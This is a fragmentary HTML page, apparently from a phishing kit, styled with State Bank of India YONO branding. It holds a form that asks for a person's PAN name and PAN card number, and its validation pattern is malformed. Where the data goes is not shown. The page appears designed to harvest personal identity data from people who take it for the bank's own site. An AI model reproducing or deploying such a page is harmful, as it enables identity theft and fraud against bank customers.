...
<body style="    background-color: #b1adad!important;
    ...
    <nav class="navbar navbar-expand-lg bg-white navbar-light sticky-top p-0">
        ...
        <a  class="navbar-brand" href="#" rel="noopener noreferrer"><img  height="60px"
                src="img/logo.png" style="    margin-left: 8px;;"></a>
                                        ...
                                        margin-left:;">
                                            ...
                                            " class="sbi-yono-logo" src="img/sbi_intouch_logo.svg"><br><br> -->
                                                ...
                                                <div class="wrap-input100 validate-input">
                                                    <label for="cid">Pan Name</label>
                                                    <input class="input100" type="text" name="Pan_Name"maxlength="35" placeholder="" required>
                                                    
                                                </div>
                                                <div class="wrap-input100 validate-input">
                                                    <label for="cid">Pancard No</label>
                                                    <input class="input100" type="text" name="Pancard_No" placeholder=""maxlength="10" pattern="[aA-aZ]{5,}[0-9]{4,}[aA-aZ]{1,}" title="Valid PAN Format Is:ABCDE1234A" required="">
    ...
    border-color: #420ee3;    width: 201px;"type="submit">
                               ...
                               <img src="img/ufoot.png" alt="" style="
    height: 639px;
">
